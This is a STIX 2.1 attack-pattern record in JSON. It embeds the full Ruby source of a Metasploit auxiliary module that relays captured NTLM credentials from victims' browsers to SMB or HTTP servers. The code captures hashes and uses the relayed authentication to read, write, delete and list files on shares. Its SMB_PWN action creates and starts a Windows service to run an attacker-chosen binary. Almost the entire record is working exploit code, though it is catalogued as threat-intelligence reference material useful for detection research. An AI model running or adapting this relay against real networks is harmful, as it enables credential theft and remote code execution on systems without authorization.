{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--205d69de-6e4f-4d3a-9385-4c32a732a2a5",
    "created": "2024-08-14T16:21:47.8651Z",
    "modified": "2024-08-14T16:21:47.865104Z",
    "name": "HTTP Client MS Credential Relayer",
    "description": " This module relays negotiated NTLM Credentials from an HTTP server to multiple protocols. Currently, this module supports relaying to SMB and HTTP.  Complicated custom attacks requiring multiple requests that depend on each other can be written using the SYNC* options. For example, a CSRF-style attack might first set an HTTP_GET request with a unique SNYNCID and set an HTTP_POST request with a SYNCFILE, which contains logic to look through the database and parse out important values, such as the CSRF token or authentication cookies, setting these as configuration options, and finally create a web page with iframe elements pointing at the HTTP_GET and HTTP_POSTs. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/http_ntlmrelay.rb",
            "external_id": "http_ntlmrelay.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/exceptions'\n\n\nNTLM_CONST = Rex::Proto::NTLM::Constants\nNTLM_CRYPT = Rex::Proto::NTLM::Crypt\nMESSAGE = Rex::Proto::NTLM::Message\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n\n  # Aliases for common classes\n  XCEPT  = Rex::Proto::SMB::Exceptions\n  CONST  = Rex::Proto::SMB::Constants\n  NDR = Rex::Encoder::NDR\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'HTTP Client MS Credential Relayer',\n      'Description' => %q{\n          This module relays negotiated NTLM Credentials from an HTTP server to multiple\n          protocols. Currently, this module supports relaying to SMB and HTTP.\n\n          Complicated custom attacks requiring multiple requests that depend on each\n          other can be written using the SYNC* options. For example, a CSRF-style\n          attack might first set an HTTP_GET request with a unique SNYNCID and set\n          an HTTP_POST request with a SYNCFILE, which contains logic to look\n          through the database and parse out important values, such as the CSRF token\n          or authentication cookies, setting these as configuration options, and finally\n          create a web page with iframe elements pointing at the HTTP_GET and HTTP_POSTs.\n        },\n      'Author'      =>\n        [\n          'Rich Lundeen <richard.lundeen[at]gmail.com>',\n        ],\n      'License'     => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'WebServer', 'Description' => 'Start web server waiting for incoming authenticated connections' ]\n        ],\n      'PassiveActions' =>\n        [\n          'WebServer'\n        ],\n      'DefaultAction'  => 'WebServer'))\n\n    register_options([\n      OptBool.new('RSSL', [true, \"SSL on the remote connection \", false]),\n      OptEnum.new('RTYPE', [true, \"Type of action to perform on remote target\", \"HTTP_GET\",\n        [   \"HTTP_GET\", \"HTTP_POST\", \"SMB_GET\", \"SMB_PUT\", \"SMB_RM\", \"SMB_ENUM\",\n          \"SMB_LS\", \"SMB_PWN\" ]]),\n      OptString.new('RURIPATH', [true, \"The path to relay credentials \", \"/\"]),\n      OptString.new('PUTDATA', [false, \"This is the HTTP_POST or SMB_PUT data\" ]),\n      OptPath.new('FILEPUTDATA', [false, \"PUTDATA, but specified by a local file\" ]),\n      OptPath.new('SYNCFILE', [false, \"Local Ruby file to eval dynamically\" ]),\n      OptString.new('SYNCID', [false, \"ID to identify a request saved to db\" ]),\n\n    ])\n\n    register_advanced_options([\n      OptPath.new('RESPPAGE', [false,\n        'The file used for the server response. (Image extensions matter)', nil]),\n      OptPath.new('HTTP_HEADERFILE', [false,\n        'File specifying extra HTTP_* headers (cookies, multipart, etc.)', nil]),\n      OptString.new('SMB_SHARES', [false, 'The shares to check with SMB_ENUM',\n              'IPC$,ADMIN$,C$,D$,CCMLOGS$,ccmsetup$,share,netlogon,sysvol'])\n    ])\n\n    deregister_options('DOMAIN', 'NTLM::SendLM', 'NTLM::SendSPN', 'NTLM::SendNTLM', 'NTLM::UseLMKey',\n      'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2')\n  end\n\n  # Handles the initial requests waiting for the browser to try NTLM auth\n  def on_request_uri(cli, request)\n\n    case request.method\n    when 'OPTIONS'\n      process_options(cli, request)\n    else\n      cli.keepalive = true;\n\n      # If the host has not started auth, send 401 authenticate with only the NTLM option\n      if(!request.headers['Authorization'])\n        response = create_response(401, \"Unauthorized\")\n        response.headers['WWW-Authenticate'] = \"NTLM\"\n        response.headers['Proxy-Support'] = 'Session-Based-Authentication'\n\n        response.body =\n          \"<HTML><HEAD><TITLE>You are not authorized to view this page</TITLE></HEAD></HTML>\"\n\n        cli.send_response(response)\n        return false\n      end\n      method,hash = request.headers['Authorization'].split(/\\s+/,2)\n      # If the method isn't NTLM something odd is goign on.\n      # Regardless, this won't get what we want, 404 them\n      if(method != \"NTLM\")\n        print_status(\"Unrecognized Authorization header, responding with 404\")\n        send_not_found(cli)\n        return false\n      end\n\n      print_status(\"NTLM Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}\")\n\n      if (datastore['SYNCFILE'] != nil)\n        sync_options()\n      end\n\n      handle_relay(cli,hash)\n    end\n  end\n\n  def run\n    parse_args()\n    exploit()\n  end\n\n  def process_options(cli, request)\n    print_status(\"OPTIONS #{request.uri}\")\n    headers = {\n      'MS-Author-Via' => 'DAV',\n      'DASL'          => '<DAV:sql>',\n      'DAV'           => '1, 2',\n      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',\n      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',\n      'Cache-Control' => 'private'\n    }\n    resp = create_response(207, \"Multi-Status\")\n    headers.each_pair {|k,v| resp[k] = v }\n    resp.body = \"\"\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  # The call to handle_relay should be a victim HTTP type 1 request\n  def handle_relay(cli_sock, hash)\n    print_status(\"Beginning NTLM Relay...\")\n    message = Rex::Text.decode_base64(hash)\n    # get type of message, which will be HTTP, SMB, ...\n    protocol = datastore['RTYPE'].split('_')[0]\n    if(message[8,1] != \"\\x03\")\n      # Relay NTLMSSP_NETOTIATE from client to server (type 1)\n      case protocol\n        when 'HTTP'\n          resp, ser_sock = http_relay_toserver(hash)\n          if resp.headers[\"WWW-Authenticate\"]\n            t2hash = resp.headers[\"WWW-Authenticate\"].split(\" \")[1]\n          else\n            print_error \"#{rhost} is not requesting authentication.\"\n            cli_sock.close\n            ser_sock.close\n            return false\n          end\n        when 'SMB'\n          t2hash, ser_sock = smb_relay_toservert1(hash)\n      end\n      # goes along with above, resp is now just the hash\n      client_respheader = \"NTLM \" << t2hash\n\n      # Relay NTLMSSP_CHALLENGE from server to client (type 2)\n      response = create_response(401, \"Unauthorized\")\n      response.headers['WWW-Authenticate'] = client_respheader\n      response.headers['Proxy-Support'] = 'Session-Based-Authentication'\n\n      response.body =\n        \"<HTML><HEAD><TITLE>You are not authorized to view this page</TITLE></HEAD></HTML>\"\n\n      cli_sock.send_response(response)\n\n      # Get the type 3 hash from the client and relay to the server\n      cli_type3Data = cli_sock.get_once(-1, 5)\n      begin\n        cli_type3Header = cli_type3Data.split(/\\r\\nAuthorization:\\s+NTLM\\s+/,2)[1]\n        cli_type3Hash = cli_type3Header.split(/\\r\\n/,2)[0]\n      rescue ::NoMethodError\n        print_error(\"Error: Type3 hash not relayed.\")\n        cli_sock.close()\n        return false\n      end\n      case protocol\n        when 'HTTP'\n          resp, ser_sock = http_relay_toserver(cli_type3Hash, ser_sock)\n        when 'SMB'\n          ser_sock = smb_relay_toservert3(cli_type3Hash, ser_sock)\n          # perform authenticated action\n          action = datastore['RTYPE'].split('_')[1]\n          case action\n            when 'GET'\n              resp = smb_get(ser_sock)\n            when 'PUT'\n              resp = smb_put(ser_sock)\n            when 'RM'\n              resp = smb_rm(ser_sock)\n            when 'ENUM'\n              resp = smb_enum(ser_sock)\n            when 'LS'\n              resp = smb_ls(ser_sock)\n            when 'PWN'\n              resp = smb_pwn(ser_sock, cli_sock)\n          end\n      end\n      report_info(resp, cli_type3Hash)\n\n      # close the client socket\n      response = set_cli_200resp()\n      cli_sock.send_response(response)\n      cli_sock.close()\n      if protocol == 'HTTP'\n        ser_sock.close()\n      end\n      return\n    else\n      print_error(\"Error: Bad NTLM sent from victim browser\")\n      cli_sock.close()\n      return false\n    end\n  end\n\n  def parse_args()\n    # Consolidate the PUTDATA and FILEPUTDATA options into FINALPUTDATA\n    if datastore['PUTDATA'] != nil and datastore['FILEPUTDATA'] != nil\n      print_error(\"PUTDATA and FILEPUTDATA cannot both contain data\")\n      raise ArgumentError\n    elsif datastore['PUTDATA'] != nil\n      @finalputdata = datastore['PUTDATA']\n    elsif datastore['FILEPUTDATA'] != nil\n      f = File.open(datastore['FILEPUTDATA'], \"rb\")\n      @finalputdata = f.read\n      f.close\n    end\n\n    if (not framework.db.active) and (not datastore['VERBOSE'])\n      print_error(\"No database configured and verbose disabled, info may be lost. Continuing\")\n    end\n  end\n\n  # sync_options dynamically changes the arguments of a running attack\n  # this is useful for multi staged relay attacks\n  # ideally I would use a resource file but it's not easily exposed, and this is simpler\n  def sync_options()\n    print_status(\"Dynamically eval()'ing local ruby file: #{datastore['SYNCFILE']}\")\n    # previous request might create the file, so error thrown at runtime\n    if not ::File.readable?(datastore['SYNCFILE'])\n      print_error(\"SYNCFILE unreadable, aborting\")\n      raise ArgumentError\n    end\n    data = ::File.read(datastore['SYNCFILE'])\n    eval(data) # WARNING: This can be insanely insecure!\n  end\n\n  # relay creds to server and perform any HTTP specific attacks\n  def http_relay_toserver(hash, ser_sock = nil)\n    timeout = 20\n    type3 = (ser_sock == nil ? false : true)\n\n    method = datastore['RTYPE'].split('_')[1]\n    theaders = ('Authorization: NTLM ' << hash << \"\\r\\n\" <<\n          \"Connection: Keep-Alive\\r\\n\" )\n\n    # HTTP_HEADERFILE is how this module supports cookies, multipart forms, etc\n    if datastore['HTTP_HEADERFILE'] != nil\n      print_status(\"Including extra headers from: #{datastore['HTTP_HEADERFILE']}\")\n      # previous request might create the file, so error thrown at runtime\n      if not ::File.readable?(datastore['HTTP_HEADERFILE'])\n        print_error(\"HTTP_HEADERFILE unreadable, aborting\")\n        raise ArgumentError\n      end\n      # read file line by line to deal with any dos/unix ending ambiguity\n      File.readlines(datastore['HTTP_HEADERFILE']).each do|header|\n        next if header.strip == ''\n        theaders << (header) << \"\\r\\n\"\n      end\n    end\n\n    opts = {\n    'uri'     => normalize_uri(datastore['RURIPATH']),\n    'method'  => method,\n    'version' => '1.1',\n    }\n    if (@finalputdata != nil)\n      # we need to get rid of an extra \"\\r\\n\"\n      theaders = theaders[0..-3]\n      opts['data'] = @finalputdata << \"\\r\\n\\r\\n\"\n    end\n    opts['SSL'] = true if datastore[\"RSSL\"]\n    opts['raw_headers'] = theaders\n\n    ser_sock = connect(opts) if !type3\n\n    r = ser_sock.request_raw(opts)\n    resp = ser_sock.send_recv(r, opts[:timeout] ? opts[:timeout] : timeout, true)\n\n    # Type3 processing\n    if type3\n      # check if auth was successful\n      if resp.code == 401\n        print_error(\"Auth not successful, returned a 401\")\n      else\n        print_good(\"Auth successful, saving server response in database\")\n      end\n      vprint_status(resp.to_s)\n    end\n    return [resp, ser_sock]\n  end\n\n  # relay ntlm type1 message for SMB\n  def smb_relay_toservert1(hash)\n    rsock = Rex::Socket::Tcp.create(\n      'PeerHost' => datastore['RHOST'],\n      'PeerPort' => datastore['RPORT'],\n      'Timeout'  => 3,\n      'Context'  =>\n        {\n          'Msf'       => framework,\n          'MsfExploit'=> self,\n        }\n    )\n    if (not rsock)\n      print_error(\"Could not connect to target host (#{target_host})\")\n      return\n    end\n    ser_sock = Rex::Proto::SMB::SimpleClient.new(rsock, rport == 445 ? true : false, [1])\n\n    if (datastore['RPORT'] == '139')\n      ser_sock.client.session_request()\n    end\n\n    blob = Rex::Proto::NTLM::Utils.make_ntlmssp_secblob_init('', '', 0x80201)\n    ser_sock.client.negotiate(true)\n    ser_sock.client.require_signing = false\n    resp = ser_sock.client.session_setup_with_ntlmssp_blob(blob, false)\n    resp = ser_sock.client.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)\n\n    # Save the user_ID for future requests\n    ser_sock.client.auth_user_id = resp['Payload']['SMB'].v['UserID']\n\n    begin\n      #lazy ntlmsspblob extraction\n      ntlmsspblob = 'NTLMSSP' <<\n              (resp.to_s().split('NTLMSSP')[1].split(\"\\x00\\x00Win\")[0]) <<\n              \"\\x00\\x00\"\n    rescue ::Exception => e\n      print_error(\"Type 2 response not read properly from server\")\n      raise e\n    end\n    ntlmsspencodedblob = Rex::Text.encode_base64(ntlmsspblob)\n    return [ntlmsspencodedblob, ser_sock]\n  end\n\n  # relay ntlm type3 SMB message\n  def smb_relay_toservert3(hash, ser_sock)\n    # arg = get_hash_info(hash)\n    dhash = Rex::Text.decode_base64(hash)\n\n    # Create a GSS blob for ntlmssp type 3 message, encoding the passed hash\n    blob =\n      \"\\xa1\" + Rex::Proto::NTLM::Utils.asn1encode(\n        \"\\x30\" + Rex::Proto::NTLM::Utils.asn1encode(\n          \"\\xa2\" + Rex::Proto::NTLM::Utils.asn1encode(\n            \"\\x04\" + Rex::Proto::NTLM::Utils.asn1encode(\n              dhash\n            )\n          )\n        )\n      )\n\n    resp = ser_sock.client.session_setup_with_ntlmssp_blob(\n        blob,\n        false,\n        ser_sock.client.auth_user_id\n      )\n    resp = ser_sock.client.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)\n\n    # check if auth was successful\n    if (resp['Payload']['SMB'].v['ErrorClass'] == 0)\n      print_status(\"SMB auth relay succeeded\")\n    else\n      failure = Rex::Proto::SMB::Exceptions::ErrorCode.new\n      failure.word_count = resp['Payload']['SMB'].v['WordCount']\n      failure.command = resp['Payload']['SMB'].v['Command']\n      failure.error_code = resp['Payload']['SMB'].v['ErrorClass']\n      raise failure\n    end\n    return ser_sock\n  end\n\n  # gets a specified file from the drive\n  def smb_get(ser_sock)\n    share, path = datastore['RURIPATH'].split('\\\\', 2)\n    path = path\n    ser_sock.client.tree_connect(share)\n    ser_sock.client.open(\"\\\\\" << path, 0x1)\n    resp = ser_sock.client.read()\n    print_status(\"Reading #{resp['Payload'].v['ByteCount']} bytes from #{datastore['RHOST']}\")\n    vprint_status(\"----Contents----\")\n    vprint_status(resp[\"Payload\"].v[\"Payload\"])\n    vprint_status(\"----End Contents----\")\n    ser_sock.client.close()\n    return resp[\"Payload\"].v[\"Payload\"]\n  end\n\n  # puts a specified file\n  def smb_put(ser_sock)\n    share, path = datastore['RURIPATH'].split('\\\\', 2)\n    path = path\n    ser_sock.client.tree_connect(share)\n\n    fd = ser_sock.open(\"\\\\#{path}\", 'rwct')\n    fd << @finalputdata\n    fd.close\n\n    logdata = \"File \\\\\\\\#{datastore['RHOST']}\\\\#{datastore['RURIPATH']} written\"\n    print_status(logdata)\n    return logdata\n  end\n\n  # deletes a file from a share\n  def smb_rm(ser_sock)\n    share, path = datastore['RURIPATH'].split('\\\\', 2)\n    path = path\n    ser_sock.client.tree_connect(share)\n    ser_sock.client.delete('\\\\' << path)\n    logdata = \"File \\\\\\\\#{datastore['RHOST']}\\\\#{datastore['RURIPATH']} deleted\"\n    print_status(logdata)\n    return logdata\n  end\n\n  # smb share enumerator, overly simplified, just tries connecting to configured shares\n  # This could be improved by using techniques from SMB_ENUMSHARES\n  def smb_enum(ser_sock)\n    shares = []\n    datastore[\"SMB_SHARES\"].split(\",\").each do |share_name|\n      begin\n        ser_sock.client.tree_connect(share_name)\n        shares << share_name\n      rescue\n        next\n      end\n    end\n    print_status(\"Shares enumerated #{datastore[\"RHOST\"]} #{shares.to_s()}\")\n    return shares\n  end\n\n  # smb list directory\n  def smb_ls(ser_sock)\n    share, path = datastore['RURIPATH'].split('\\\\', 2)\n    ser_sock.client.tree_connect(share)\n    files = ser_sock.client.find_first(path << \"\\\\*\")\n\n    print_status(\n      \"Listed #{files.length} files from #{datastore[\"RHOST\"]}\\\\#{datastore[\"RURIPATH\"]}\"\n    )\n\n    if datastore[\"VERBOSE\"]\n      files.each {|filename| print_status(\"    #{filename[0]}\")}\n    end\n    return files\n  end\n\n  # start a service. This methos copies a lot of logic/code from psexec (and smb_relay)\n  def smb_pwn(ser_sock, cli_sock)\n\n    # filename is a little finicky, it needs to be in a format like\n    # \"%SystemRoot%\\\\system32\\\\calc.exe\" or \"\\\\\\\\host\\\\c$\\\\WINDOWS\\\\system32\\\\calc.exe\n    filename = datastore['RURIPATH']\n\n    ser_sock.connect(\"IPC$\")\n    opts = {\n      'Msf' => framework,\n      'MsfExploit' => self,\n      'smb_pipeio' => 'rw',\n      'smb_client' => ser_sock\n    }\n    uuidv = ['367abb81-9844-35f1-ad32-98f038001003', '2.0']\n    handle = Rex::Proto::DCERPC::Handle.new(uuidv, 'ncacn_np', cli_sock.peerhost, [\"\\\\svcctl\"])\n    dcerpc = Rex::Proto::DCERPC::Client.new(handle, ser_sock.socket, opts)\n\n    print_status(\"Obtraining a service manager handle...\")\n    stubdata =\n      NDR.uwstring(\"\\\\\\\\#{datastore[\"RHOST\"]}\") +\n      NDR.long(0) +\n      NDR.long(0xF003F)\n    begin\n      response = dcerpc.call(0x0f, stubdata)\n      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\n        scm_handle = dcerpc.last_response.stub_data[0,20]\n      end\n    rescue ::Exception => e\n      print_error(\"Error: #{e}\")\n      return\n    end\n\n    print_status(\"Creating a new service\")\n\n    servicename = Rex::Text::rand_text_alpha(8)\n    displayname = Rex::Text::rand_text_alpha(rand(32)+1)\n    svc_handle = nil\n\n    stubdata =\n      scm_handle +\n      NDR.wstring(servicename) +\n      NDR.uwstring(displayname) +\n      NDR.long(0x0F01FF) + # Access: MAX\n      NDR.long(0x00000110) + # Type: Interactive, Own process\n      NDR.long(0x00000003) + # Start: Demand\n      NDR.long(0x00000000) + # Errors: Ignore\n\n      NDR.wstring(filename) + # Binary Path\n      NDR.long(0) + # LoadOrderGroup\n      NDR.long(0) + # Dependencies\n      NDR.long(0) + # Service Start\n      NDR.long(0) + # Password\n      NDR.long(0) + # Password\n      NDR.long(0) + # Password\n      NDR.long(0)   # Password\n\n    begin\n        response = dcerpc.call(0x0c, stubdata)\n        if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\n            svc_handle = dcerpc.last_response.stub_data[0,20]\n            #svc_status = dcerpc.last_response.stub_data[24,4]\n        end\n    rescue ::Exception => e\n        print_error(\"Error: #{e}\")\n        return\n    end\n\n    print_status(\"Closing service handle...\")\n    begin\n      response = dcerpc.call(0x0, svc_handle)\n    rescue ::Exception\n    end\n\n    print_status(\"Opening service...\")\n    begin\n      stubdata =\n          scm_handle +\n          NDR.wstring(servicename) +\n          NDR.long(0xF01FF)\n\n      response = dcerpc.call(0x10, stubdata)\n      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\n        svc_handle = dcerpc.last_response.stub_data[0,20]\n      end\n    rescue ::Exception => e\n      print_error(\"Error: #{e}\")\n      return\n    end\n\n    print_status(\"Starting the service...\")\n    stubdata =\n      svc_handle +\n      NDR.long(0) +\n      NDR.long(0)\n    begin\n      response = dcerpc.call(0x13, stubdata)\n      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\n      end\n    rescue ::Exception => e\n      return\n    end\n\n    print_status(\"Removing the service...\")\n    stubdata =\n      svc_handle\n    begin\n      response = dcerpc.call(0x02, stubdata)\n      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\n      end\n    rescue ::Exception => e\n      print_error(\"Error: #{e}\")\n    end\n\n    print_status(\"Closing service handle...\")\n    begin\n      response = dcerpc.call(0x0, svc_handle)\n    rescue ::Exception => e\n      print_error(\"Error: #{e}\")\n    end\n\n    ser_sock.disconnect(\"IPC$\")\n  end\n\n  # print status, and add to the info database\n  def report_info(resp, type3_hash)\n    data = get_hash_info(type3_hash)\n\n    # no need to generically always grab everything, but grab common config options\n    # and the response, some may be set to nil and that's fine\n    data[:protocol] = datastore['RTYPE']\n    data[:RHOST] = datastore['RHOST']\n    data[:RPORT] = datastore['RPORT']\n    data[:RURI] = datastore['RURIPATH']\n    data[:SYNCID] = datastore['SYNCID']\n    data[:Response] = resp\n\n    report_note(\n      :host => data[:ip],\n      :type => 'ntlm_relay',\n      :update => 'unique_data',\n      :data => data\n    )\n  end\n\n  # mostly taken from http_ntlm module handle_auth function\n  def get_hash_info(type3_hash)\n    # authorization string is base64 encoded message\n    domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(type3_hash)\n    nt_len = ntlm_hash.length\n\n    if nt_len == 48 #lmv1/ntlmv1 or ntlm2_session\n      arg = { :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,\n        :lm_hash => lm_hash,\n        :nt_hash => ntlm_hash\n      }\n\n      if arg[:lm_hash][16,32] == '0' * 32\n        arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE\n      end\n    # if the length of the ntlm response is not 24 then it will be bigger and represent\n    # a ntlmv2 response\n    elsif nt_len > 48 #lmv2/ntlmv2\n      arg = { :ntlm_ver   => NTLM_CONST::NTLM_V2_RESPONSE,\n        :lm_hash          => lm_hash[0, 32],\n        :lm_cli_challenge => lm_hash[32, 16],\n        :nt_hash          => ntlm_hash[0, 32],\n        :nt_cli_challenge => ntlm_hash[32, nt_len  - 32]\n      }\n    elsif nt_len == 0\n      print_status(\"Empty hash from #{host} captured, ignoring ... \")\n    else\n      print_status(\"Unknown hash type from #{host}, ignoring ...\")\n    end\n\n    arg[:host] = host\n    arg[:user] = user\n    arg[:domain] = domain\n\n    return arg\n  end\n\n  # function allowing some basic/common configuration in responses\n  def set_cli_200resp()\n    response = create_response(200, \"OK\")\n    response.headers['Proxy-Support'] = 'Session-Based-Authentication'\n\n    if (datastore['RESPPAGE'] != nil)\n      begin\n        respfile = File.open(datastore['RESPPAGE'], \"rb\")\n        response.body = respfile.read\n        respfile.close\n\n        type = datastore['RESPPAGE'].split('.')[-1].downcase\n        # images can be especially useful (e.g. in email signatures)\n        case type\n        when 'png', 'gif', 'jpg', 'jpeg'\n          print_status('setting content type to image')\n          response.headers['Content-Type'] = \"image/\" << type\n        end\n      rescue\n        print_error(\"Problem processing respfile. Continuing...\")\n      end\n    end\n    if (response.body.empty?)\n      response.body = \"<HTML><HEAD><TITLE>My Page</TITLE></HEAD></HTML>\"\n    end\n    return response\n  end\nend\n"
}